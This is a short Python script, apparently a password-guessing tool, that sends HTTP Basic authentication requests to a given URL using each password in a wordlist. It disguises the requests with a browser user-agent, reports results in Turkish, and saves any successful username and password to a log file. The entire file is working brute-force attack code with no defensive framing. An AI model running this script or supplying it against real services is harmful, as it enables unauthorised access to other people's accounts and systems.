# brute_http.py
import requests
from requests.auth import HTTPBasicAuth

def http_brute_force(url, username, wordlist_file):
    headers = {'User-Agent': 'Mozilla/5.0'}

    with open(wordlist_file, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        response = requests.get(url, auth=HTTPBasicAuth(username, password), headers=headers)

        if response.status_code == 200:
            print(f"[✓] Giriş başarılı: {username}:{password}")
            with open("http_success.log", "a") as log:
                log.write(f"{username}:{password} @ {url}\n")
            break
        else:
            print(f"[-] Deneme başarısız: {password} - Kod: {response.status_code}")
